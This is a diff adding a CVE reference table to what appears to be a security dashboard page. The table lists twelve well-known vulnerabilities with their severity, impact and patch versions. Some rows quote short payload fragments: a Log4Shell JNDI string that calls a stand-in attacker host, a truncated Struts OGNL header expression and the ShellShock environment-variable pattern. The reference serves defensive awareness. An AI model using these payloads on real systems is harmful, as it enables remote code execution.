@@ -30,6 +30,7 @@
       <a href="#admin" class="nav-link" id="adminNavLink" style="display:none;"><i class="fas fa-cog"></i> Admin</a>
       <a href="#osint" class="nav-link"><i class="fas fa-search"></i> OSINT</a>
       <a href="#compliance" class="nav-link"><i class="fas fa-clipboard-check"></i> Compliance</a>
+      <a href="#cves" class="nav-link"><i class="fas fa-bug"></i> CVE List</a>
       <a href="#diff" class="nav-link"><i class="fas fa-not-equal"></i> Diff</a>
       <a href="#docs" class="nav-link"><i class="fas fa-book"></i> Docs</a>
     </div>
@@ -425,6 +426,45 @@
             <button class="btn btn-primary" id="complianceAnalyzeBtn"><i class="fas fa-chart-bar"></i> Analyze</button>
           </div>
           <div id="complianceResults" style="margin-top:0.5rem;max-height:600px;overflow-y:auto;"></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- CVE LIST SECTION -->
+    <section id="cves" class="section">
+      <div class="section-header">
+        <h1><i class="fas fa-bug"></i> CVE Reference List</h1>
+        <p class="section-subtitle">Notable Common Vulnerabilities and Exposures with real-world examples</p>
+      </div>
+
+      <div class="card glass">
+        <div class="card-body">
+          <p style="margin-bottom:0.75rem;font-size:0.85rem;color:var(--muted);">
+            Use the <strong>Pentest &gt; CVE Search</strong> tool to query the NVD for any CVE by keyword, or browse the
+            curated examples below. Links open the official NVD reference for each entry.
+          </p>
+          <div style="margin-bottom:1rem;"><input type="text" id="cveFilterInput" class="cyber-input" placeholder="Filter by CVE ID, name or year (e.g. 2021, log4shell)..." style="width:100%;" oninput="filterCveList(this.value)" /></div>
+          <div class="table-wrap" style="overflow-x:auto;">
+            <table class="cyber-table" style="font-size:0.78rem;">
+              <thead>
+                <tr><th>CVE</th><th>Name / Type</th><th>Severity</th><th>Example / Impact</th><th>Fix</th><th></th></tr>
+              </thead>
+              <tbody id="cveListBody">
+                <tr><td>CVE-2021-44228</td><td>Log4Shell — Java Log4j RCE</td><td><span class="badge badge-danger">CRITICAL (10.0)</span></td><td>UNPARSABLE &quot;${jndi:ldap://attacker/a}&quot; in any logged value triggers JNDI lookup and remote code execution.</td><td>Upgrade log4j-core &ge; 2.17.1</td><td><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" target="_blank" rel="noopener noreferrer">NVD &rarr;</a></td></tr>
+                <tr><td>CVE-2023-4863</td><td>WebP Heap Buffer Overflow (Chrome/Chromium)</td><td><span class="badge badge-danger">HIGH (8.8)</span></td><td>A crafted WebP image triggers a heap overflow in libwebp, enabling arbitrary code execution.</td><td>Update libwebp &ge; 1.3.2 / browsers</td><td><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-4863" target="_blank" rel="noopener noreferrer">NVD &rarr;</a></td></tr>
+                <tr><td>CVE-2023-44487</td><td>HTTP/2 Rapid Reset (DDoS)</td><td><span class="badge badge-danger">CRITICAL (7.5)</span></td><td>Abuse of HTTP/2 stream cancellation resets request/response bookkeeping, amplifying DDoS traffic.</td><td>Web-server HTTP/2 rate limits / updates</td><td><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-44487" target="_blank" rel="noopener noreferrer">NVD &rarr;</a></td></tr>
+                <tr><td>CVE-2017-5638</td><td>Apache Struts 2 Jakarta RCE</td><td><span class="badge badge-danger">CRITICAL (10.0)</span></td><td>Content-Type header with OGNL expression: <code>%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}</code> executes server-side.</td><td>Patch Struts 2.3.32 / 2.5.10</td><td><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-5638" target="_blank" rel="noopener noreferrer">NVD &rarr;</a></td></tr>
+                <tr><td>CVE-2014-0160</td><td>Heartbleed — OpenSSL TLS</td><td><span class="badge badge-danger">HIGH (7.5)</span></td><td>Missing bounds check in Heartbeat extension lets attackers read up to 64KB of server memory per request.</td><td>Upgrade OpenSSL 1.0.1g</td><td><a href="https://nvd.nist.gov/vuln/detail/CVE-2014-0160" target="_blank" rel="noopener noreferrer">NVD &rarr;</a></td></tr>
+                <tr><td>CVE-2014-6271</td><td>ShellShock — Bash RCE</td><td><span class="badge badge-danger">CRITICAL (9.8)</span></td><td>&quot;() { :; }; cmd&quot; in environment variables (via CGI, HTTP headers) executes shell commands.</td><td>Patch bash / disable CGI</td><td><a href="https://nvd.nist.gov/vuln/detail/CVE-2014-6271" target="_blank" rel="noopener noreferrer">NVD &rarr;</a></td></tr>
+                <tr><td>CVE-2017-0144</td><td>EternalBlue — SMBv1 RCE (WannaCry)</td><td><span class="badge badge-danger">CRITICAL (8.8)</span></td><td>SMBv1 buffer overflow enables remote code execution; famously weaponized by WannaCry ransomware.</td><td>Patch MS17-010 / disable SMBv1</td><td><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-0144" target="_blank" rel="noopener noreferrer">NVD &rarr;</a></td></tr>
+                <tr><td>CVE-2016-5195</td><td>Dirty COW — Linux Kernel PrivEsc</td><td><span class="badge badge-danger">HIGH (7.8)</span></td><td>Race condition in copy-on-write lets a local user overwrite read-only files to gain root.</td><td>Kernel patch (4.8.3+)</td><td><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-5195" target="_blank" rel="noopener noreferrer">NVD &rarr;</a></td></tr>
+                <tr><td>CVE-2020-1472</td><td>ZeroLogon — Netlogon Auth Bypass</td><td><span class="badge badge-danger">CRITICAL (10.0)</span></td><td>Empty client credential in Netlogon (AES-CFB8) bypasses authentication to take over a domain controller.</td><td>Aug 2020 patch + enforce secure-only</td><td><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-1472" target="_blank" rel="noopener noreferrer">NVD &rarr;</a></td></tr>
+                <tr><td>CVE-2021-34527</td><td>PrintNightmare — Windows Print Spooler RCE</td><td><span class="badge badge-danger">CRITICAL (8.8)</span></td><td>A crafted print job via RPC lets attackers run code as SYSTEM.</td><td>July 2021 patch / disable Spooler</td><td><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-34527" target="_blank" rel="noopener noreferrer">NVD &rarr;</a></td></tr>
+                <tr><td>CVE-2021-45232</td><td>Apache APISIX Dashboard RCE</td><td><span class="badge badge-danger">CRITICAL (9.8)</span></td><td>Unrestricted batch API call allows remote code execution via crafted batches.</td><td>Upgrade APISIX &ge; 2.10.1</td><td><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-45232" target="_blank" rel="noopener noreferrer">NVD &rarr;</a></td></tr>
+                <tr><td>CVE-2022-22965</td><td>Spring4Shell — Spring Framework RCE</td><td><span class="badge badge-danger">CRITICAL (9.8)</span></td><td>Data binding of class.module.classLoader paths enables RCE on JDK 9+ Tomcat apps.</td><td>Upgrade Spring &ge; 5.3.18 / 5.2.20</td><td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-22965" target="_blank" rel="noopener noreferrer">NVD &rarr;</a></td></tr>
+              </tbody>
+            </table>
+          </div>
         </div>
       </div>
     </section>
